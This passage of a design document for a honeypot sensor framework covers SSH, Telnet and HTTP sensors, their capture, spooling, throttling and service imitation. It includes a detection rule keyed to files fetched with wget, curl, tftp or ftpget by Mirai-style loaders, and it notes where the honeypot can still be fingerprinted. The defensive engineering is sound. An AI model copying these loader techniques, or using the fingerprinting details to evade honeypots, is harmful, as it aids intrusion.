+(`crates/sensor-framework/src/command_codec.rs#MAX_DETECT_ATTEMPTS`) caps key-less detection attempts per session to bound the brute-force CPU
+cost; after 8 misses the session is treated as plaintext for good (`crates/sensor-framework/src/command_codec.rs#CommandCodec::decode`).
+
+### Capture sanitization
+
+`sanitize_value(input, max_len)` is the shared chokepoint every attacker string
+clears before entering an event, closing CR/LF/ANSI log injection
+(`crates/sensor-framework/src/sanitize.rs#sanitize_value`). Fixed order: collapse CR/LF/tab
+runs to one space; strip ANSI CSI escapes, C0/C1 controls, DEL, bidi and
+zero-width characters; NFC normalize; UTF-8-boundary-safe truncate to `max_len`
+bytes (`crates/sensor-framework/src/sanitize.rs#sanitize_value`, `crates/sensor-framework/src/sanitize.rs#is_dangerous`, `crates/sensor-framework/src/sanitize.rs#truncate_to_len`). `to_hex_bounded` hex-encodes byte-derived fields, safe by
+alphabet (`crates/sensor-framework/src/sanitize.rs#to_hex_bounded`).
+
+### Quarantine spool
+
+`QuarantineSpool::new(dir, max_file_size, global_budget)` stores captured bodies
+named by their SHA-256 (never the attacker filename, so traversal is impossible),
+with 0640 permissions and re-hash-on-read fail-closed integrity
+(`crates/sensor-framework/src/spool.rs#QuarantineSpool`).
+
+- `store(body)` rejects `FileSizeExceeded` when `size > max_file_size`, dedups on
+  an existing hash (no extra budget), reserves budget under the spool's accounting lock, and rejects `BudgetExhausted` past `global_budget`
+  (`sensor-framework/src/spool.rs#store`, `sensor-framework/src/spool.rs#reserve_budget`). A body is written to a staging file at 0640,
+  synced, then hard-linked to its digest name (`sensor-framework/src/spool.rs#publish`, `sensor-framework/src/spool.rs#write_and_seal`).
+- `new()` recovers used bytes by scanning the directory at startup so a restart
+  does not reset the ceiling (`sensor-framework/src/spool.rs#QuarantineSpool`, `sensor-framework/src/spool.rs#scan_existing_usage`).
+- **SSH, FTP, ADB, Telnet (binary payloads only), and TFTP spool bodies.** FTP, ADB and TFTP use `max_file_size` =
+  10_000_000 (10&nbsp;MB) (SSH uses 16&nbsp;MiB, `SPOOL_MAX_FILE_BYTES`) and `global_budget` = 100_000_000 (100&nbsp;MB). Redis,
+  HTTP, SMTP, cred, and catchall never write a body to a spool (confirmed
+  by absence of `QuarantineSpool`/`CaptureHandoff` in those crates).
+
+### Capture hand-off
+
+`CaptureHandoff` moves capture off the connection's response path so a capture
+never delays the reply - response latency must not leak whether a capture happened
+(`crates/sensor-framework/src/handoff.rs`). `submit(job)` is backed by
+`mpsc::try_send` and never blocks: a full queue drops the job, returns
+`CaptureDropped`, increments `dropped_count`, and logs at power-of-two totals
+(`crates/sensor-framework/src/handoff.rs#CaptureHandoff::submit`). Every spooling sensor sets `capture_queue_size` = **64**
+(`crates/sensor-ssh/src/server.rs#serve`, `crates/sensor-ftp/src/lib.rs#CAPTURE_QUEUE_SIZE`,
+`crates/sensor-adb/src/lib.rs#CAPTURE_QUEUE_SIZE`). Exactly one worker drains the queue strictly sequentially
+(`start_worker` panics on a second call), so `spool.store` is never called
+concurrently (`crates/sensor-framework/src/handoff.rs#CaptureHandoff::start_worker`). `orig_name` is sanitized and capped at
+`MAX_ORIG_NAME_LEN = 255` (`crates/sensor-framework/src/handoff.rs#MAX_ORIG_NAME_LEN`, `crates/sensor-framework/src/handoff.rs#process_job`); a spool refusal is counted in
+`spool_refused_count` and the upload event is still emitted, without a `sample` and marked `stored: false` with a `not_stored_reason` (`crates/sensor-framework/src/handoff.rs#CaptureHandoff::spool_refused_count`, `crates/sensor-framework/src/handoff.rs#process_job`); a panicking event builder
+is isolated with `catch_unwind` and the worker continues (`crates/sensor-framework/src/handoff.rs#process_job`).
+
+### Event emission
+
+`EventEmitter::append(event)` serializes to one NDJSON line, opens the log with
+`O_APPEND` (atomic concurrent appends on local storage), then `write_all` +
+`flush`; a serialize/append failure never partially writes a line
+(`crates/sensor-framework/src/emit.rs#EventEmitter::append`). The log directory must be local
+storage - NFS `O_APPEND` can race (`crates/sensor-framework/src/emit.rs#EventEmitter::append`).
+
+## Per-protocol capture behavior
+
+Every sensor normalizes the peer via `normalize_dual_stack`, resolves `wan_ip` from
+the local address, emits `honeypot_connection` (authenticated=false) at accept, and
+sanitizes all attacker strings. Signal-type semantics are owned by
+[`events-and-signals.md`](events-and-signals.md).
+
+### sensor-ssh
+
+Impersonates OpenSSH on Ubuntu (conventional port 22). Performs a full real SSH
+handshake using the crate's own crypto primitives, then presents the fake shell and
+captures SCP/SFTP transfers.
+
+- **Handshake / crypto.** The offer is rendered from one table per KEXINIT slot
+  (`crates/sensor-ssh/src/transport/algorithms.rs#Kex`,
+  `crates/sensor-ssh/src/transport/algorithms.rs#HostKeyAlgorithm`,
+  `crates/sensor-ssh/src/transport/algorithms.rs#Cipher`,
+  `crates/sensor-ssh/src/transport/algorithms.rs#Mac`,
+  `crates/sensor-ssh/src/transport/mod.rs#build_kexinit`), and the client's lists are negotiated
+  against the same tables per RFC 4253 section 7.1: for each list, the first algorithm the
+  client names that the sensor also supports
+  (`crates/sensor-ssh/src/transport/algorithms.rs#negotiate`). Currently: KEX
+  `curve25519-sha256`, its pre-standard name `curve25519-sha256@libssh.org`,
+  `ecdh-sha2-nistp256` and `diffie-hellman-group14-sha256`
+  (`crates/sensor-ssh/src/transport/kex.rs#perform_kex_server`), host key
+  `ssh-ed25519` (loaded-or-generated and persisted so it is stable across restarts), ciphers in
+  OpenSSH 8.9's order `chacha20-poly1305@openssh.com`, `aes128-ctr`, `aes192-ctr`, `aes256-ctr`,
+  `aes128-gcm@openssh.com`, `aes256-gcm@openssh.com`, MACs `hmac-sha2-256-etm@openssh.com`,
+  `hmac-sha2-512-etm@openssh.com`, `hmac-sha1-etm@openssh.com`, `hmac-sha2-256`,
+  `hmac-sha2-512`, `hmac-sha1` (negotiated only for a direction whose cipher is not an AEAD),
+  compression `none` (`crates/sensor-ssh/src/main.rs#main`). Each cipher frames its own packets
+  (`crates/sensor-ssh/src/transport/packet_cipher.rs#PacketCipher`). Banner default is the persona OpenSSH version
+  (`crates/sensor-ssh/src/main.rs#DEFAULT_BANNER`). A residual HASSHServer distinguishability
+  from the narrower KEXINIT offer is a tracked follow-up.
+- **Offered by OpenSSH 8.9 but not by the sensor.** `rsa-sha2-256` and `rsa-sha2-512` host
+  keys: the only RSA implementation in the dependency tree is the `rsa` crate, a release candidate
+  with RUSTSEC-2023-0071 (a timing side channel on private-key operations, no fixed release),
+  which `deny.toml` accepts only as a dependency of the SSH test client. Linking it into the
+  sensor would put that advisory in a production binary, so it is left out until the owner
+  decides to accept it or the crate is fixed. A client that offers no host key but RSA is refused
+  and logged like any other mismatch (`negotiation_failed` `host_key`). Also not offered:
+  `sntrup761x25519-sha512@openssh.com` and the other post-quantum exchanges, `ecdh-sha2-nistp384`
+  and `-nistp521`, `diffie-hellman-group16-sha512`, `-group18-sha512` and
+  `-group-exchange-sha256`, an `ecdsa-sha2-nistp256` host key, and the UMAC MACs. The
+  `client_kex` lists on handshake-end events show whether any client population needs one of
+  them.
+- **No common algorithm.** A client whose lists share nothing with the sensor's (any of key
+  exchange, host key, either cipher, either MAC when its cipher is not an AEAD, compression) is
+  sent `SSH_MSG_DISCONNECT` with reason 3
+  (key exchange failed) and the description `no matching key exchange method found` (or the host
+  key, cipher, MAC or compression equivalent), and the connection is closed
+  (`crates/sensor-ssh/src/transport/mod.rs#refuse_and_close`). Before this it was sent nothing and
+  held its connection until the idle timeout. A `first_kex_packet_follows` guess that the
+  negotiation shows wrong is dropped unread, as RFC 4253 section 7 requires, and counted in the
+  client-to-server sequence number (section 6.4), so the first encrypted client packet is
+  number 4; a right guess is used as the exchange's first packet.
+- **Cost and throttle of `diffie-hellman-group14-sha256`.** Measured on the release binary over
+  whole loopback connections that send KEXINIT and one key-exchange packet, with the sensor's CPU
+  read from `/proc`: 3.50-3.73 ms per group14 connection against 0.90-1.15 ms for
+  `curve25519-sha256`, so a group14 connection costs about 3-4 times a curve25519 one. The two
+  modular exponentiations (`crates/sensor-ssh/src/transport/kex.rs#dh_group14_server`) are about
+  2.7 ms of the group14 figure. The concurrency and per-source caps bound simultaneous
+  connections, not their rate, and a client can send a trivial value and spend no CPU of its own,
+  so unthrottled about 200 group14 connections per second (0.75 core over 3.6 ms) from one source
+  would fill the unit's `CPUQuota=75%` (`deploy/sensor-ssh.service`) and slow every other
+  session of the process.
+  The owner decided on 2026-10-15 to keep offering group14 in OpenSSH 8.9's order and throttle it
+  (`crates/sensor-ssh/src/transport/group14_gate.rs`). The exponentiation runs on the blocking
+  pool, not on one of the sensor's two async workers, and one process-wide permit
+  (`GROUP14_PERMITS`) is held for twice the exchange's cost, which holds group14 to half a core
+  (about 140 exchanges a second) and leaves 25 points of the quota for everything else; a
+  concurrency cap alone would still allow a full core, above the quota. A client that negotiates
+  group14 while the permit is taken waits at most `GROUP14_WAIT` (2 s), then is sent
+  `SSH_MSG_DISCONNECT` with reason 12 (too many connections) and the description `too many
+  concurrent diffie-hellman-group14-sha256 exchanges, try again or use another key exchange
+  method`, and the connection is closed. Its handshake-end `honeypot_session_end` event ends
+  `malformed_input` (the framework has no refusal ending) with `kex_refused` `group14_busy`.
+  `curve25519` and `ecdh-sha2-nistp256` clients never touch the gate and are answered while it is
+  full (`crates/sensor-ssh/tests/group14_throttle.rs`). The permit is taken after the client's
+  exchange value has arrived, so a connection that never sends it holds nothing.
+- **Known limit: the packets before key exchange are counted, not typed.** The server reads a
+  fixed number of unencrypted packets (the KEXINIT, an optional discarded guess, then the
+  exchange's first message), so an `SSH_MSG_IGNORE` or `SSH_MSG_DEBUG` that a client sends in
+  that window (RFC 4253 section 11 allows them at any time) would be read as the key-exchange
+  value and fail the exchange. No scanner or OpenSSH client seen sends one there; it is not
+  handled, and a change would be separate work.
+- **Connection event at accept.** `honeypot_connection` (`authenticated=false`) is emitted
+  once per connection at accept, before the version exchange, like every other TCP sensor
+  (`crates/sensor-ssh/src/server.rs#handle_session`, `crates/sensor-ssh/src/auth.rs#AuthState::emit_connection_event`).
+  A scanner that reads the banner and leaves, a client that sends a bad version string, and a
+  bare TCP probe are therefore recorded, and the fleet probe's "socket answered" check sees a
+  line for port 22. Nothing later emits a second connection event. It was previously emitted
+  only after key exchange, so those three produced no event.
+- **Handshake end.** A connection that ends before key exchange completes (banner grab, bare
+  probe, non-SSH bytes, a stalled or truncated handshake) emits one `honeypot_session_end`
+  (telemetry, never scored) with `end_reason` (`peer_closed`, `idle_timeout`, `malformed_input`,
+  or `transport_error`), `phase` (`version_exchange` or `key_exchange`), `duration_ms`, and
+  `client_version` (sanitized, bounded) when the client's identification line arrived
+  (`crates/sensor-ssh/src/auth.rs#AuthState::handshake_end_event`). Once the client's KEXINIT has
+  parsed, the event also carries `client_kex`, the client's offered lists (`kex`, `host_key`,
+  `cipher_c2s`, `cipher_s2c`, `mac_c2s`, `mac_s2c`, `compression_c2s`, `compression_s2c`, each
+  sanitized and cut at 1024 bytes), so an operator can see which algorithms a client that never
+  got a session was asking for. A refusal for no common algorithm ends `malformed_input` (the
+  framework has no refusal ending) with `negotiation_failed` naming the list that failed:
+  `kex`, `host_key`, `cipher_c2s`, `cipher_s2c` or `compression`. A connection that completes
+  key exchange emits none (its later endings are recorded on the capture events), and none is
+  emitted when `max_duration` cancels the handler. The sensor still proceeds into key exchange
+  after a non-`SSH-` identification line; the line is not rejected.
+- **Auth** (`auth.rs`): **accepts every credential and method** - reaching userauth
+  is itself crypto proof the peer is real - except `none`, which is rejected with
+  `USERAUTH_FAILURE` listing `publickey,password` to defeat the
+  `PreferredAuthentications=none` probe (`crates/sensor-ssh/src/auth.rs#AuthState::handle_userauth`, `crates/sensor-ssh/src/auth.rs#build_userauth_failure`). Captures sanitized `username`
+  and `method` in `honeypot_login_attempt`; the **password is read only to advance
+  the parser and is never stored, logged, or emitted** (`crates/sensor-ssh/src/auth.rs`, `crates/sensor-ssh/src/auth.rs#AuthState::handle_userauth`). String
+  cap `MAX_METADATA_STRING_LEN = 255` (`crates/sensor-ssh/src/auth.rs#MAX_METADATA_STRING_LEN`).
+- **Channel table:** one connection may hold several channels, each with its own
+  handler and its own flow-control state, keyed by the client's sender-channel number
+  (mirrored as the server id). The table is capped at `MAX_CHANNELS_PER_CONNECTION`
+  = 10; a valid `session` open past the cap, or reusing an id already in the table, is
+  refused with `SSH_OPEN_RESOURCE_SHORTAGE` ("channel limit reached") so an OPEN flood
+  cannot pin unbounded shells. Only `session` channels are confirmed; `direct-tcpip`,
+  every other type, and a zero peer max-packet are refused at open with
+  `SSH_OPEN_UNKNOWN_CHANNEL_TYPE` - this closes off attacker-directed proxying by
+  construction (`crates/sensor-ssh/src/server.rs#MAX_CHANNELS_PER_CONNECTION`, `crates/sensor-ssh/src/channel.rs#handle_channel_open`, `crates/sensor-ssh/src/channel.rs#build_channel_open_resource_shortage`).
+  A channel the server has already closed stays in the table until the peer's CLOSE
+  arrives, and meanwhile refuses new requests and drops further data.
+- **Flow control** (RFC 4254 section 5.2, per channel): the server advertises
+  `INITIAL_WINDOW_SIZE` 2 MiB and `CHANNEL_MAX_PACKET_SIZE` 32 KiB on every
+  confirmation. Server-to-client output honors the **peer's** window and max packet:
+  output is queued per channel and emitted in chunks of at most `min(peer max packet,
+  32 KiB, remaining peer window)`, stopping at a zero peer window and resuming only on
+  that channel's `WINDOW_ADJUST`, so a 2 MiB reply is never one oversized packet.
+  Output waiting for a peer that is not reading is bounded: a channel holding one line's
+  worth of unsent output (8 MiB) or its connection two lines' worth runs no further line
+  until the peer reads, input that arrives meanwhile waits in order, and all of it is charged
+  to a 64 MiB output budget (`crates/sensor-ssh/src/server.rs#OUTPUT_BUDGET_BYTES`; see
+  [capacity planning](../operations/capacity-planning.md#ssh-sensor-worst-case-memory)).
+  Client-to-server data is counted as it is consumed, and the server sends
+  `WINDOW_ADJUST` once the consumed bytes reach half the initial window (1 MiB)
+  (`crates/sensor-ssh/src/server.rs#next_frame`, `crates/sensor-ssh/src/server.rs#flush_channel_output`, `crates/sensor-ssh/src/server.rs#build_channel_window_adjust`, `crates/sensor-ssh/src/channel.rs#INITIAL_WINDOW_SIZE`, `crates/sensor-ssh/src/channel.rs#CHANNEL_MAX_PACKET_SIZE`).
+- **Channel requests** (`channel.rs`, dispatched in `handle_session`): `pty-req` (sets
+  a flag on the channel), `shell`, `exec <cmd>` and `subsystem sftp` are accepted only
+  on a channel still awaiting its handler; any other subsystem or request type (`env`,
+  `window-change`, `signal`) is not acted on. A reply is sent **only when `want_reply`
+  is set**: `CHANNEL_SUCCESS` if accepted, `CHANNEL_FAILURE` for an unknown or refused
+  request (`crates/sensor-ssh/src/channel.rs#handle_channel_request`, `crates/sensor-ssh/src/channel.rs#ChannelAction`, `crates/sensor-ssh/src/server.rs#build_channel_failure`).
+  A `shell` or `exec` is also refused while the session is over its memory limit, or while the
+  session memory pool has under 512 KiB left and the session would pass its floor with that much
+  added; a session within its floor is accepted and the session holding the most above its share
+  is asked to let go (`crates/sensor-ssh/src/server.rs#shell_room`, `crates/sensor-framework/src/session_memory.rs#make_room`).
+  What sessions within their floor RESERVE past a full pool is capped at 13,421,773 bytes at once
+  (`crates/sensor-ssh/src/server.rs#SESSION_OVERDRAFT_CAP_BYTES`): past it a `shell` or `exec` is
+  refused the same way, and a running line is stopped with its session kept, until room returns.
+  The cap bounds reserved room, not live bytes: a session it refuses keeps what it allocated, and
+  key exchange, login and packet allocations are never stopped by it, so the worst case is not
+  closed (see the table in [capacity planning](../operations/capacity-planning.md#ssh-sensor-worst-case-memory)).
+  Room returns when the session asked to let go ends, and no other is asked meanwhile. One
+  blocked inside a write to a peer that is not reading is not woken: it ends at the write
+  deadline (the idle timeout, 60 s, restarted by every byte the peer accepts) or `max_duration`
+  (600 s), so a newcomer may be refused for up to 600 s, and asks chain one session at a time.
+- **Interactive shell vs exec:** the `pty-req` flag selects terminal behavior. With a
+  pty the shell prints its state-derived prompt, echoes typed bytes, converts bare LF
+  to CR-LF with `onlcr`, and sends both streams merged on `CHANNEL_DATA`. Without a pty
+  (an `exec`, or `shell` with no `pty-req`) there is no echo or prompt, LF is left
+  untouched, and stderr is sent as `CHANNEL_EXTENDED_DATA` type 1
+  (`SSH_EXTENDED_DATA_STDERR`) while stdout stays on `CHANNEL_DATA`. `exec <cmd>` runs
+  once in the exec-mode shell (noninteractive bash diagnostics); `scp -t ` starts the
+  SCP receiver, `subsystem sftp` the SFTP handler. An exec command that reads its standard
+  input (see [Fake shell](#fake-shell-ssh-telnet-adb)) is held with the channel open: the
+  channel's data is its input, collected while the window is replenished as usual, until the
+  client's `CHANNEL_EOF`, a `CHANNEL_CLOSE` (the command is killed and nothing is sent), the
+  capture ceiling, or the session's end. With a pty the input is a terminal (echo, Ctrl-D,
+  Ctrl-C), without one a pipe. At the shell, a typed line that reads its input takes the bytes
+  after it (with a pty, each line until the command has what it reads for, or to Ctrl-D; without
+  one, to the channel's EOF) and the prompt returns when it ends; those bytes are its input and
+  are not also offered to the binary-payload capture
+  (`crates/sensor-ssh/src/server.rs#ChannelHandler`). A shell without a pty reads a pipe as
+  bash does: no prompt, no `TERM`, `SSH_TTY` or `.bashrc` variables, no history, a bare `sh`
+  reads the rest of the input as its script, and the client's `CHANNEL_EOF` ends the shell
+  with the last command's status. `MAX_LINE_LEN = 8192`
+  (`crates/sensor-ssh/src/server.rs#handle_session`, `crates/sensor-ssh/src/server.rs#build_channel_extended_data`, `crates/sensor-ssh/src/server.rs#MAX_LINE_LEN`, `crates/sensor-framework/src/shell/mod.rs#onlcr`).
+- **Exec lifecycle:** a one-shot exec sends its queued output, then `exit-status`
+  (`want_reply` false), then `CHANNEL_EOF`, then `CHANNEL_CLOSE`, each only once all
+  queued output has drained, so a window-stalled reply still ends cleanly. A command that
+  reads no input does this at the request, whether or not the client ever sends EOF; one held
+  for its input does it when the input ends. An interactive shell that exits takes the same
+  path. A peer `CHANNEL_EOF` is a half-close and does not cut queued output; it ends a held
+  command's input (`crates/sensor-ssh/src/server.rs#build_exit_status`, `crates/sensor-ssh/src/server.rs#build_channel_eof`, `crates/sensor-ssh/src/server.rs#build_channel_close`, `crates/sensor-ssh/src/server.rs#finish_exec`).
+- **Write deadline:** the session stream is wrapped once in `TimeoutStream`, so a write
+  or flush pending past `idle_timeout` fails rather than letting a peer that stops
+  reading (a zero window with a full socket buffer) stall the handler; the egress budget
+  is charged per data chunk and ends the session once spent (`crates/sensor-ssh/src/timeout_stream.rs#TimeoutStream`, `crates/sensor-ssh/src/server.rs#classify_read_failure`).
+- **Capture** (`transfer.rs`): captures **inbound writes only, never serves reads**
+  (`crates/sensor-ssh/src/transfer.rs`). SCP receive mode parses the `C<mode> <size> <name>` header and streams
+  the body to `honeypot_malware_upload`. SFTP v3 subset supports INIT/VERSION,
+  OPEN (write-mode only), WRITE, CLOSE→capture; every other verb returns
+  `SSH_FX_OP_UNSUPPORTED` (`crates/sensor-ssh/src/transfer.rs#SftpHandler::feed`, `crates/sensor-ssh/src/transfer.rs#SftpHandler::handle_open`). Caps: `MAX_CAPTURE_BODY` 10_000_000,
+  `SFTP_MAX_FILE_BODY` 10_000_000, `SFTP_MAX_OPEN_HANDLES` 64,
+  `SFTP_MAX_SESSION_BYTES` 20_000_000, `SFTP_MAX_PACKET_SIZE` 262_144
+  (`crates/sensor-ssh/src/transfer.rs#MAX_CAPTURE_BODY`, `crates/sensor-ssh/src/transfer.rs#SFTP_MAX_FILE_BODY`, `crates/sensor-ssh/src/transfer.rs#SFTP_MAX_OPEN_HANDLES`, `crates/sensor-ssh/src/transfer.rs#SFTP_MAX_SESSION_BYTES`, `crates/sensor-ssh/src/transfer.rs#SFTP_MAX_PACKET_SIZE`). A body past its cap is kept as a prefix and emitted with
+  `truncated: true` plus the real `wire_size` (an `exec_stdin` or `shell_stdin` capture cut at the SSH capture limit
+  differs: its `wire_size` is a lower bound, the limit plus at most the one data packet, at most 32 KiB, that crossed it; a `binary_shell_payload` records the full size). A transfer still open when the session
+  ends (SCP before its trailer, SFTP handles never CLOSEd) is kept as a capture with
+  `complete: false` rather than dropped.
+- **Spool:** 10&nbsp;MB / 100&nbsp;MB, hand-off queue 64 (`crates/sensor-ssh/src/server.rs#serve`).
+- **Bounds:** common defaults (deliberately identical to Telnet), `max_concurrent`
+  256 (`crates/sensor-ssh/src/main.rs#DEFAULT_MAX_CONCURRENT`).
+- **Emits:** `honeypot_connection`, `honeypot_login_attempt`,
+  `honeypot_command_exec`, `honeypot_file_download` (via shell),
+  `honeypot_malware_upload` (SCP/SFTP, a binary shell payload, a command's standard input).
+  Shell and exec channels share the connection's handle on the sensor's
+  [command-event budget](#command-event-budget-ssh-telnet-adb): repeats past it become one
+  `command_summary` event per source network per minute.
+
+### sensor-telnet
+
+Impersonates a Telnet login (conventional port 23). Negotiates IAC, accepts any
+credential, then presents the fake shell.
+
+- **IAC** (`telnet.rs`): sends `IAC WILL ECHO` and `IAC WILL SGA` at connect;
+  answers client `WILL <opt>`→`DONT` and `DO <opt>`→`WONT` (except its own offered
+  ECHO/SGA), never replies to `WONT`/`DONT` (RFC 854 loop avoidance) (`crates/sensor-telnet/src/telnet.rs#negotiation_preamble`,
+  `crates/sensor-telnet/src/telnet.rs#IacFilter::process`). The IAC/subnegotiation stripper survives being split across
+  reads (`crates/sensor-telnet/src/telnet.rs#IacFilter::process`).
+- **Flow** (`crates/sensor-telnet/src/handler.rs#handle_connection`): writes the persona issue banner and
+  `<host> login:` prompt; reads the username (cap `MAX_USERNAME_LEN = 255`);
+  prompts `Password:` and reads the password **read-only, then drops it, never
+  stored or logged** (`crates/sensor-telnet/src/handler.rs#handle_connection`); accepts unconditionally and emits
+  `honeypot_login_attempt` (authenticated=true); enters the FakeShell. Echoes typed
+  characters, hides password characters, prints the active level's prompt, and closes
+  only when the shell reports `close_session` (see below). `MAX_LINE_LEN` 8192
+  (`crates/sensor-telnet/src/handler.rs#LineReader`). The reader keeps what it read off the
+  socket and cuts lines from it only as they are wanted, so a typed line that reads its input
+  (`cat > f`) takes the raw bytes after it, as a terminal, until Ctrl-D or until the command has
+  the lines it reads for (`read x`), the same input model as
+  the SSH shell (`crates/sensor-telnet/src/handler.rs#LineReader::read_held`). The rest of a
+  CR-LF or CR-NUL Enter already read stays with its line. The binary-payload capture keeps the
+  bytes the line reader consumed, so input a command consumed is captured once, as that.
+- **Data encoder** (`crates/sensor-telnet/src/handler.rs#encode_telnet_data`): every
+  application byte the client reads (issue banner, login and password prompts,
+  typed-character echo, shell output, shell prompt) goes through one encoder and the
+  one writer built on it (`crates/sensor-telnet/src/handler.rs#write_telnet_data`). Order is fixed: ONLCR (every LF
+  becomes CR-LF, all other bytes untouched, no UTF-8 assumption, `crates/sensor-framework/src/shell/mod.rs#onlcr`), then
+  the optional per-session XOR codec (applied only where a shell exists: the shell
+  reply, its prompt, and the first prompt after login pass the `FakeShell`; the
+  pre-login banner, prompts and typed-character echo pass `None` and get ONLCR and IAC
+  doubling only), then RFC 854 doubling of every literal `0xFF` data byte. Negotiation
+  bytes (the connect preamble and the filter's `DONT`/`WONT` replies) bypass the
+  encoder through the raw writer because their `0xFF` bytes are protocol markers, not
+  data (`crates/sensor-telnet/src/handler.rs#write_raw`, `crates/sensor-framework/src/shell/mod.rs#FakeShell`). Egress is charged on the encoded length.
+- **Session end** (`crates/sensor-telnet/src/handler.rs#handle_connection`): when the shell's result has
+  `close_session` set (the outer shell exited, not a nested `exit`,
+  `crates/sensor-framework/src/shell/mod.rs#CommandResult`), the sensor writes that output once through the encoder
+  with no prompt appended, records `CaptureEnd::ClientLogout`, and drops the
+  connection. Every other exit (peer close, idle timeout, failed write, spent egress)
+  records its own ending (`crates/sensor-framework/src/handoff.rs#CaptureEnd`).
+- **Write deadline** (`crates/sensor-telnet/src/handler.rs#write_raw`): every write, negotiation replies and
+  in-reader echo included, is wrapped in a timeout of the connection's `idle_timeout`
+  (`crates/sensor-framework/src/bounds.rs#ConnectionBounds`). A timed-out or failed write ends the session (recorded as
+  `TransportError` where a capture is armed), so a client that stops reading cannot
+  hold the handler on a blocked `write_all`.
+- **Infected-source hold** (`crates/sensor-telnet/src/infected_hold.rs#InfectedHold`): a
+  Mirai-family loader repeats its infection every minute or two for as long as the target keeps
+  answering; on a real device the bot replaces telnetd, so the port closes and the loader moves
+  on. When a session ends having run a file it fetched (`wget`, `curl`, `tftp`, `ftpget`) or
+  assembled from typed bytes (an ELF, or a file of more than one write) natively, its source
+  is held (`crates/sensor-framework/src/shell/mod.rs#FakeShell::infection_completed`: status 0 from
+  a file with a fetch origin or an assembled-program digest). A build for another CPU
+  (Exec format error), a download never run, a one-`echo` script and an assembled downloader that
+  cannot reach its stage-2 server (status 1) do not count, so a per-architecture loop is held only
+  once its native build runs. For the hold, default 6 h, new connections from that source are
+  closed with `SO_LINGER` 0, so the peer reads a reset, before any banner, event or session
+  slot is spent (`crates/sensor-telnet/src/lib.rs#reset`). Other sources are served as ever; the
+  first session is recorded exactly as without the hold. A source is an IPv4 address or an IPv6
+  /64; the table holds 4096 sources, evicting the one expiring soonest, lives in memory only and is
+  empty after a restart. The hold is marked when the session ends or is cut off at
+  `max_duration`. `PROPOLIS_TELNET_INFECTED_HOLD_SECS` sets it (`0` to `604800`; `0` turns the
+  hold off and the startup log says so; anything else refuses to start). Refusals are counted
+  per source and in total, and one journal line a minute names the count, the distinct sources
+  and the five most refused; no event is written for a refusal. **Residual difference from a
+  closed port:** the kernel completes the handshake (a SYN-ACK is sent) before the reset, where a
+  closed port answers the SYN itself with an RST; a scanner that judges the port by the handshake
+  alone can tell.
+- **Bounds:** common defaults, `max_concurrent` 256. Spools only shell-phase evidence: a binary
+  shell payload and the standard input a command read; there is no file-transfer protocol.
+- **Emits:** `honeypot_connection`, `honeypot_login_attempt`,
+  `honeypot_command_exec`, `honeypot_file_download` (via shell), `honeypot_malware_upload` (a
+  binary shell payload, a command's standard input). A looping loader's repeated commands past
+  the [command-event budget](#command-event-budget-ssh-telnet-adb) become one `command_summary`
+  event per source network per minute; its logins, connections, captures and derived URLs keep
+  their own events.
+- **Protocol probes.** A session whose first bytes are another protocol's opening (TLS, RDP, SMB,
+  HTTP, SSH, SIP, RTSP, DNS, JDWP, Redis, X11, MQTT, SOCKS, VNC, ADB, PostgreSQL) is recorded as
+  a `catchall_probe` event with `probe_protocol`, not as a malware sample. Anything that carries
+  an executable or archive signature, or sent more than 4096 bytes, stays a sample. Details and
+  the metadata keys: [events and signals](events-and-signals.md#protocol-probes-on-the-telnet-port).
+
+### sensor-http
+
+Impersonates **Ubuntu-packaged nginx 1.18.0** (conventional port 80).
+
+- **Behavior** (`handler.rs`): `SERVER_BANNER = "nginx/1.18.0 (Ubuntu)"`. Serves
+  `/` (nginx default welcome page) and `/robots.txt`; GET/HEAD only, other methods
+  give an nginx 405 and unknown paths an nginx 404 (`crates/sensor-http/src/handler.rs#build_response`). Static 200s carry
+  Last-Modified/ETag/Accept-Ranges and a regenerated `Date` header. Captures
+  method, path, query, user-agent, host, and a body preview into one
+  `honeypot_command_exec` (authenticated=false, `crates/sensor-http/src/handler.rs#handle_connection`).
+  Credentials are cut out of `path`, `query` and `body_preview` before they are
+  stored: the value of every password-like parameter (url-encoded, JSON at any
+  depth, XML and XML-RPC, multipart) becomes `<redacted>` while the parameter names
+  and usernames stay (`crates/sensor-http/src/redact.rs#redact_body`,
+  `crates/sensor-http/src/redact.rs#redact_target`). An `Authorization` or
+  `Proxy-Authorization` header is recorded as its scheme (`auth_scheme`,
+  `proxy_auth_scheme`, or `<redacted>` for a value with no scheme word) plus, for
+  `Basic` and `Digest`, the username (`auth_username`, `proxy_auth_username`),
+  never the password or token
+  (`crates/sensor-http/src/redact.rs#redact_authorization`); a `Cookie` header is
+  recorded as `cookie` with every value replaced
+  (`crates/sensor-http/src/redact.rs#redact_cookie`). Any event where a value was
+  replaced carries `credentials_redacted: true`; the key is absent otherwise. The
+  policy is [../security/sample-and-credential-privacy.md](../security/sample-and-credential-privacy.md#credential-handling). Caps: request line
+  8192, header block 16384, body capture 65536 (`crates/sensor-http/src/handler.rs#MAX_REQUEST_LINE_LEN`, `crates/sensor-http/src/handler.rs#MAX_HEADER_BLOCK`, `crates/sensor-http/src/handler.rs#MAX_BODY_CAPTURE`). The header block
+  counts every byte up to and including its blank line, empty or malformed lines included, and
+  is never buffered past 16384 bytes; a block that has not ended by then gets nginx's
+  `400 Bad Request` "Request Header Or Cookie Too Large" page
+  (`crates/sensor-http/src/handler.rs#NGINX_494_HTML`). Header values are read out of the block
+  when the event is built, so a request holds its block once and nothing per line (a line nginx
+  would skip as invalid, such as a lone `:`, costs its bytes only). A declared body is read to
+  its end before the reply (the first 65536 bytes kept, the rest drained); the event
+  records `body_size` (bytes received), `body_declared`, `body_complete` and
+  `truncated`. A body over nginx's 1 MB `client_max_body_size` gets nginx's 413 before
+  any of it is read; a client that hangs up before its declared body has arrived gets
+  no reply, as nginx gives none, and the event says `body_complete: false`.
+- **Bounds:** common defaults except **`max_concurrent` 512** (higher than the
+  others, `crates/sensor-http/src/main.rs#DEFAULT_MAX_CONCURRENT`). Besides each read's own
+  timeout, the whole header block must arrive within the idle timeout (60 s) of its first byte,
+  as nginx's `client_header_timeout` times a whole header, and the whole body within the idle
+  timeout of the header's end (`crates/sensor-http/src/handler.rs#BoundedReader`); a request cut
+  this way is closed unanswered, and one cut in its body is recorded with `body_complete: false`.
+  nginx times a body per read (`client_body_timeout`) instead; the whole-body limit is this
+  sensor's, so a byte a minute cannot hold a request's buffers for the whole 600 s
+  `max_duration`. A request therefore holds its buffers for at most the read timeout plus twice
+  the idle timeout, 150 s at the defaults. Each connection's heap is
+  charged to the session memory pool, 70% of the unit's `MemoryMax` shared by both listeners
